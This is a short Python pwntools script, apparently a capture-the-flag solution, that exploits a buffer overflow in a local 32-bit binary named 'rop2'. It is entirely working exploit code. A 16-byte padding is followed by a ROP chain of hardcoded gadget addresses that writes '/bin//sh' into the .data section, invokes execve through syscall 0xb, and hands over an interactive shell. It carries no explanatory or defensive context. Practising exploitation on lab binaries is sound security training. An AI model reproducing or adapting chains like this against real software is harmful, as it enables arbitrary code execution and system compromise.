#!/usr/bin/python3

from pwn import *

PROG_NAME = "./rop2"

p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

#bof at offset 16
payload = b'A'*16
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x6e69622f) # /bin
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da060) #.data
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret;
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x68732f2f) # //sh
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da064) #.data+0x4
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x00000000) #null
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da068) #.data+0x8
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
payload += p32(0x08056114) #pop eax; pop edx; pop ebx; ret;
payload += p32(0x0000000b) #syscall number 0xb
payload += p32(0x00000000) #null
payload += p32(0x080da060) #.data
payload += p32(0x0806ef51) #xor ecx, ecx; int 0x80;

p.sendline(payload)



p.interactive()